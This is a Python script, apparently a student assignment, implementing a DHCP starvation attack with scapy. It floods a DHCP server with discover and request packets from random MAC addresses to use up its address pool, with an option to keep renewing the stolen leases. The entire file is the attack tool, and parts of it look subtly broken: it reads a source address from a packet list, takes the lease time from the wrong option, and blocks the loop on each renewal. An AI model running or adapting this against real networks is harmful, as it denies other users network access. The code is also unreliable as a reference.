# Ariel Bar Kalifa 214181604
# Yedidya Marashe 213661499

import argparse
import random
import time
from itertools import count
from multiprocessing import Process

from scapy.all import *

IP_REGEX = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
count = 0


def validate_ip_address(address):
    """
    Validate an ip address for argparse constraint matching.
    """
    if re.match(IP_REGEX, address):
        return address
    raise argparse.ArgumentTypeError('invalid value for ip argument (src or target)')


def generate_mac_address():
    return ("%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    ))


def starve(args):
    """
    make a while loop that will do a dhcp request with a random mac address
    the ip src in the dhcp request will be the 0.0.0.0 and the ip dst will be the target(or broadcast)
    will take all the available ip addresses
    if the -p check is true, will save clock for every ip address and will renew the
    dhcp request 5 seconds before the end of the clock
    """
    while True:
        mac = generate_mac_address()
        ip, lease_time = get_ip_address(mac, args)
        if ip:
            print("IP: " + ip)
        else:
            print("No IP address")
            break
        if args.persist:
            # save clock for every ip address and renew the dhcp request 5 seconds before the end of the clock
            renewal_thread = Process(target=renew, args=(lease_time, ip, mac, args))
            renewal_thread.start()
            renewal_thread.join()
        print(count)


def get_ip_address(mac, args) -> (str, str):
    """
    send the dhcp discover packet to the target
    """
    target = "255.255.255.255"
    if args.target:
        target = args.target
    x_id = random.randint(0, 30000)
    # craft dhcp discover packet
    dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / IP(src="0.0.0.0", dst=target) / UDP(sport=68, dport=67) / BOOTP(
        op=1, chaddr=mac, xid=x_id) / DHCP(options=[("message-type", "discover"), ("end")])

    # send the dhcp discover packet
    sendp(dhcp_discover, iface=args.iface, verbose=1)
    offer = sniff(count=1, lfilter=lambda x: BOOTP in x and x[BOOTP].xid == x_id, timeout=3)
    time.sleep(2)
    print(offer.show())
    if offer:
        # craft dhcp request packet
        dhcp_request = Ether(dst=offer.src, src=mac) / IP(src="0.0.0.0", dst=args.target) / UDP(sport=68, dport=67) / BOOTP(
            op=1, chaddr=mac, xid=x_id) / DHCP(options=[("message-type", "request"), ("requested_addr", offer.getlayer(BOOTP).yiaddr),
                                                         ("server_id", offer.getlayer(BOOTP).siaddr), ("end")])

        scapy.sendp(dhcp_request, iface=args.iface, timeout=1, verbose=0)
        ack = sniff(count=1, lfilter=lambda x: BOOTP in x and x[BOOTP].xid == x_id, timeout=3)
        if ack:
            # return the ip address and the lease time
            return offer.getlayer(BOOTP).yiaddr, offer.getlayer(BOOTP).options[-1][1]
    return None, None

def renew(lease_time, ip, mac, args):
    """
    renew ip lease from dhcp server
    :param ip:
    :param mac:
    :param args:
    :return:
    """
    time.sleep(lease_time - 5)
    target = "255.255.255.255"
    if args.target:
        target = args.target
    # craft dhcp renewal packet with the ip address
    dhcp_renew = Ether(dst=mac, src=mac) / IP(src=ip, dst=target) / UDP(sport=68, dport=67) / BOOTP(op=1, chaddr=mac) / DHCP(
        options=[("message-type", "request"), ("requested_addr", ip), ("end")])
    # send the dhcp renewal packet
    ack = srp1(dhcp_renew, iface=args.iface, timeout=1, verbose=0)
    if ack:
        print("Renewed IP: " + ip)

def main():
    # initialize argument parser for command line
    parser = argparse.ArgumentParser(description="DHCP starvation attack")
    parser.add_argument("-i", "--iface", help="Interface you wish to use", choices=get_if_list())
    parser.add_argument("-p", "--persist", help="Renew the attack if about to end")
    parser.add_argument("-t", "--target", help="IP of target", type=validate_ip_address)

    args = parser.parse_args()
    starve(args)


if __name__ == "__main__":
    main()


